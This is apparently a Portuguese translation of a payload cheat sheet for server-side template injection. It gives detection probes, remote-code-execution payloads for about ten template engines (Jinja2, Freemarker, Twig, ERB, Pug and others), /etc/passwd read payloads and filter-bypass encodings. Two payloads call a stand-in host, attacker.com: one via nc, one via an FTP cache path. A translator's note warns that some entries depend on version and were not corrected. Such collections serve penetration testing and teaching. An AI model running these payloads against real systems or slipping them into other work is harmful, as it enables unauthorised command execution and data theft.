# 🔥 Coleção de payloads de SSTI

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SSTI.tr.md) • [🇬🇷 Ελληνικά](SSTI.el.md)

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Injeção em templates do lado do servidor
```

> **Notas de precisão:** SSTI é injeção em templates processados pelo servidor; RCE é execução remota de código. Uma resposta com 49 é um indício que requer confirmação, não prova isolada. O original atribui 7777777 tanto a Jinja como a Twig: [Jinja](https://jinja.palletsprojects.com/en/stable/templates/) pode repetir cadeias, enquanto a multiplicação em [Twig](https://twig.symfony.com/doc/3.x/templates.html) é numérica; os resultados não são equivalentes. Os índices fixos de MRO/subclasses e as referências a `config`, `request` ou extensões dependem do runtime e dos objetos expostos. Alguns exemplos de leitura de ficheiros pertencem a versões antigas de Python, e as técnicas de Twig/Java/Node dependem da versão e das restrições do motor. Os payloads não foram corrigidos.

---

<a id="-detection-payloads"></a>
## 🔍 Payloads de deteção

### Deteção para vários contextos
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> Se a resposta contiver `49`, pode existir SSTI (afirmação do original; ver nota)!

### Identificar o motor de templates
```
{{7*'7'}}         → Jinja2/Twig devolve 7777777 (indicação do original; ver nota)
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

<a id="-python-jinja2"></a>
## 🐍 Python (Jinja2)

### Deteção
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### Payloads de RCE
```python
# Método 1 — config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Método 2 — cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Método 3 — MRO (o mais comum, segundo o original)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Método 4 — lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Método 5 — Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Ler ficheiros
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Contorno de filtros
```python
# Utilizar o filtro attr
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Utilizar o filtro join 
{%set x=''|join('')|attr('__class__')%}

# Codificação hexadecimal
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

<a id="-python-mako"></a>
## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

<a id="-java-freemarker"></a>
## ☕ Java (Freemarker)

### Deteção
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### Payloads de RCE
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

<a id="-java-velocity"></a>
## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Simples
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

<a id="-java-thymeleaf"></a>
## 🌱 Java (Thymeleaf)

### Deteção
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Payloads de RCE
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

<a id="-java-pebble"></a>
## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

<a id="-php-twig"></a>
## 🐦 PHP (Twig)

### Deteção
```php
{{7*7}}
{{7*'7'}}  → 7777777 (multiplicação de cadeia, segundo o original; ver nota)
{{dump(app)}}
{{_self}}
```

### Payloads de RCE
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Ler ficheiros
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

<a id="-ruby-erb"></a>
## 💎 Ruby (ERB)

### Deteção
```ruby
<%= 7*7 %>
<%= self %>
```

### Payloads de RCE
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

<a id="-nodejs-jadepug"></a>
## 🟢 Node.js (Jade/Pug)

### Deteção
```javascript
#{7*7}
-var x = 1; p= x
```

### Payloads de RCE
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

<a id="-net-razor"></a>
## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

| Motor de templates | Deteção | RCE |
|-----------------|-----------|-----|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

<a id="-bypass-techniques"></a>
## 🛡️ Técnicas de contorno de proteções

### Palavras-chave bloqueadas
```python
# Utilizar os argumentos do pedido
{{request.args.cmd}}?cmd=__class__

# Concatenação de cadeias de caracteres
{{''['__cla'+'ss__']}}

# Codificação hexadecimal
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Parênteses/chavetas bloqueados
```python
{%print(7*7)%}
```

---

<a id="-resources"></a>
## 📚 Recursos

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 Arsenal de payloads de SSTI</b><br>
  <i>Apenas para fins educativos!</i>
</p>
